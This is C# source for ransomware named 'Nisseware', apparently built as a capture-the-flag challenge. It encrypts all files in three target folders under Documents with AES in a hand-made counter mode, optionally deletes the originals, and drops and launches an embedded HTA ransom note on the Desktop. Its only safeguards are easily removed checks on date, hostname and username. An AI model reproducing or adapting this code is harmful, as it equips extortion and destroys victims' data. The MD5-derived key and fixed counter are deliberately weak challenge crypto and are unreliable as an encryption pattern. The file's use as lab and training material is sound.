using System.Diagnostics;
using System.IO.Compression;
using System.Net;
using System.Security.Cryptography;

class Program {
    static bool debug = false;

    static void Main(string[] args) {
        debug = args.Contains("--debug");

        if (debug) {
            Console.WriteLine("Starting Nisseware...");
        }

        Console.Write("Password: ");
        string password = Console.ReadLine();
        byte[] key = GetMD5Hash(password);

        DefangMalware();

        // Target specific folders to defang further
        string[] folders = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "blueprints_legetøj"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "produkt_salg"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "fælles_installationsfiler"),
        };

        foreach (string folder in folders) {
            if (debug) {
                Console.WriteLine($"Encrypting files in folder {folder}...");
            }
            
            string[] files = Directory.GetFiles(folder);
            foreach (string file in files) {
                EncryptFile(file, key, args.Contains("--delete-original"));
            }
        }

        if (debug) {
            Console.WriteLine("Nisseware has finished encrypting all files.");
        }

        GenerateRansomNote(key);
    }

    static byte[] GetMD5Hash(string s) {
        if (debug) {
            Console.WriteLine($"Generating MD5 hash for string {s}...");
        }

        using (MD5 md5 = MD5.Create()) {
            byte[] b = System.Text.Encoding.UTF8.GetBytes(s);
            return md5.ComputeHash(b);
        }
    }

    static void EncryptFile(string filePath, byte[] key, bool deleteOriginalFile = false) {
        if (debug) {
            Console.WriteLine($"Encrypting file {filePath}...");
        }

        byte[] salt = new byte[16] { 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10 };
        using (Stream inputStream = File.OpenRead(filePath))
        using (Stream outputStream = File.Create(filePath + ".nis")) {
            AesEncrypt(key, salt, inputStream, outputStream);
        }

        // Only delete file if --delete-original is specified
        if (deleteOriginalFile) {
            if (debug) {
                Console.WriteLine($"Deleting original file {filePath}...");
            }

            File.Delete(filePath);
        }
    }

    public static void AesEncrypt(byte[] key, byte[] salt, Stream inputStream, Stream outputStream) {
        SymmetricAlgorithm aes = Aes.Create();
        aes.Mode = CipherMode.ECB;
        aes.Padding = PaddingMode.None;
        int blockSize = aes.BlockSize / 8;
        byte[] c = (byte[])salt.Clone();
        Queue<byte> xorMask = new();
        var zeroIv = new byte[blockSize];
        ICryptoTransform encryptor = aes.CreateEncryptor(key, zeroIv);
        int b;
        while ((b = inputStream.ReadByte()) != -1) {
            if (xorMask.Count == 0) {
                var block = new byte[blockSize];
                encryptor.TransformBlock(c, 0, c.Length, block, 0);
                for (var i2 = c.Length - 1; i2 >= 0; i2--) {
                    if (++c[i2] != 0) {
                        break;
                    }
                }

                foreach (var b2 in block) {
                    xorMask.Enqueue(b2);
                }
            }
            var mask = xorMask.Dequeue();
            outputStream.WriteByte((byte)(((byte)b) ^ mask));
        }
    }

    static void GenerateRansomNote(byte[] key) {
        if (debug) {
            Console.WriteLine("Generating ransom note...");
        }

        string ransomPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "instructions.hta");
        string ransomNoteBase64 = "H4sIAPPRXWUA/+1Z+3PiRhL+ff+KXm1lvalajMTD3sXGVRiIl2T9qDW53N1vAxrEREKjGo3AXJL/Pd+MHgaMXd5scsk9eEqtoeeb/rp7usXpy8F1f/yPmyF9GF9+pJvvzz+O+uTU6vUfmv16fTAe5Bdah65HY8XiVGghYxbV68Mrh5y51kmnXl+tVoer5qFUQX38qT7Xi6hVj6RM+aGvfefsxakR4UsLHfGzq9Ht7fCH3qfhaT0XmOusw5IkElNm9FM6l6tRPGZpeM5U14mlQ72bG2DrjUfXV11nzVOHRn0cHixSwe/49BAfB3Q7urr4OBxd3Y57V/1h9wDjIFynlzzOcjUbs8RswbtOhcahiVQ+x3R6LqahQ1MZa363qH6aTpWMouKYR3xqlBRYUhEHERdxqlk8hVYrXInYlyuINCSxVAsWOXTZ+/vocvTP4fn347FZytW1Q+fXnwbDT11nMOp9vL4wP/T1vOt4ruvQnItgrouTy9HV7o/PTmHwLevBnoAqEk0Ri4OMBZj9W7Zkt1YIOohmWWzR061mSr/5mn6CkArAh4qn4l98LN8cu+5bah+7X5/g8i+bv/PlNINl9KGMQ77Gj+JKyZIpYpGmbqmOL81AiL7ja6OISMzoTS7Fj/vS59Ttkucd0c8/0wN549iIjcbXrx9e9bx2OTHtXiU3n668MDXcROfZZBKZq1plvByguM5UTDMWpYXMLNe8CwudvDit51Y9e/HidCL9NaV6HcG0EzYNAyWz2O/Qq5l9nNAMvtMhr5Hc0UFPCRYdvKUU4VNLuRK4njDfh8t0AJEWTAUitodyydUskqvaXYfmwvd5fOKQjCPJ/K5TIjEB5YtlOb8ldFNgvQeTu+5XJ4X7lGeJzAO4Q2ySyijT/IS0TOzcEZ9hHA4m8q4GB7Dw8pCoQbSJOcHZHqiVaF2J6N46tamMpLq3kcVNtLWWPaN7rtv0Bo+j2lptBdFrwfJuOce2fRDUusYiEcAMU/gFVyeI9S1slj8zHe9Qo22WawWrwpiIC9jNqNEmJ84Q2h3KkoSrKYP/OGe9CB72I0cg0UxEXBFeoVonmIv7/HSizr7NL0oFz4sBmTSbYFDC44DTHIbUyDEhDHFaB/R8GcVhfvy01cp1FNY5alrOKvM07OkjJt1rtNxJa6rwpnfWJvBLnBjHqWZqel/dK4CKNGFI57mOrfEPDVpi/+ad6zXel3FRTolQguLXr94ftd0TxCL0bkyzgfThLDmPJhjvJ3Ht4959jo1FCuKWItACNPgytEmOq7fkMxAEcnFozJ0lKcmAWAwnB7MIqjS0YwzTSC9LromHKcjXCkxrM7h0AL1B6S74acQZ4E2knlf2jWWMMK0C2Zp+0+vNFrChcNNL/ic5vFEyUGyxgNUnKgtAiCEpFaHiJQdw+ZRFgQRxC0694S0I5vfXDImIBkQnZYsMmYIyo4JpCoGFhZqTTP8sFv+bGDvKGfuwFCmNSIShCb4IOyVQTPiPPke0RQLZsEimNsKwcQWaltwnXwRCs4hYFppd7d/CyG/RbbPtXtV71OWZGAOxg2GpwqdXvG2en52/dxjaIAW741O+UNK0Z6d0zr5BVCASqnhBLAQU8DgNsYNt8ISCJwQ3o872UvemJFuDeLkzVOOecLCdTGatUcjyMiYX7Y+OJwzTsj/bMsxERv69ZUomnkLTtMvwdrzxOeuxZjDlxg7ax4nciq72sN1v9yttcEgtUZjkeM65iRTwJBNsQZqj0E0DPlkr0og4NAoIM6Q4H/SlfB/2p5fzaBDsRNHD3PafTnTjL0Z0b2aaHeILBl4XyJLoh0yIbm5waZLvkf/n+fk8N/9iPI9iX7MUJQnoFVQQaooecK3VOiSnYtz5M3l+vqbPK2PzPWPPrv0F9UlhcOfs4mGeNBW9orZLw/EH7G089mmeKTQK4MAWidpm0gvJVSRQtshpOJ0zUeXUmGL0fjGKynJH/CycR5s4y6a4KgjgY3lR4Jy5d+etltscuMNBz2t5x/67mec1/PdHbn/QaHutdnvQ99+fe8fvf0u99Nyi6MHG/geQ9LfRxRivl/mdSZTlqAFNpW/KDtx64nNEOro4oWk0QIiYomTGIw0ia6UUhdYfSsZPo8Evv6+ZH7sJsFUbUt7vb3f/+24THM8as+bn3QnYtANq1D281Og2EZGf1/NawOnforqf475g6x3OFwgjW3OgPzNFCYr8OarGGRKVrf43Sn1b/OcF/8tHXe05gL7L+7YcErp2VK1b+yEa+6WY8tT0gRZp3otIg6TYP4EOXSDlOIE9jdc4BVjjTfktngk0C+QM2z1i8JdhPkfzSmy2A1TO9IoBPsedCoWdIc54tN28Ghsi/QBhyHKEVUWOZSyFHWDXh/tLMb+v3UsWDh/PvV/S62w5cnFQfZk7qubb/lPwK6z+zDGXGAAA";
        byte[] ransomNoteBytes = Convert.FromBase64String(ransomNoteBase64);
        using (MemoryStream ms = new(ransomNoteBytes))
        using (GZipStream gz = new(ms, CompressionMode.Decompress))
        using (StreamReader sr = new(gz)) {
            string ransomNote = sr.ReadToEnd();

            // Generate ID from key and insert in note
            byte[] idBytes = GetMD5Hash(Convert.ToHexString(key));
            string id = Convert.ToHexString(idBytes);
            ransomNote = ransomNote.Replace("{ID}", id);
            Console.WriteLine($"Generated ID {id}");

            File.WriteAllText(ransomPath, ransomNote);
        }

        if (debug) {
            Console.WriteLine("Opening ransom note hta...");
        }

        var psi = new ProcessStartInfo(ransomPath) {
            UseShellExecute = true
        };
        Process.Start(psi);
    }

    static void DefangMalware() {
        if (debug) {
            Console.WriteLine("Defanging malware...");
        }

        // Exit if run after CTF starts
        if (DateTime.Now >= new DateTime(DateTime.Now.Year, 11, 30)) {
            if (debug) {
                Console.WriteLine("Timestamp is too late");
            }
            ExitWithWarning();
        }

        // Exit if computer name isn't "LegetøjROs"
        string computerName = Dns.GetHostName();
        Console.WriteLine("Computer name: " + computerName);
        if (computerName != "LegetøjROs") {
            if (debug) {
                Console.WriteLine("Computer name doesn't match expected");
            }
            ExitWithWarning();
        }

        // Exit if current user isn't "Alf"
        string username = Environment.UserName;
        Console.WriteLine("Username: " + username);
        if (username != "Alf") {
            if (debug) {
                Console.WriteLine("Username doesn't match expected");
            }
            ExitWithWarning();
        }
    }

    static void ExitWithWarning() {
        Console.WriteLine("ADVARSEL: Kør ikke programmet på din lokale maskine, brug en VM!");
        Console.WriteLine("WARNING: Do not run this program on your local machine, use a VM!");
        Environment.Exit(0);
    }
}
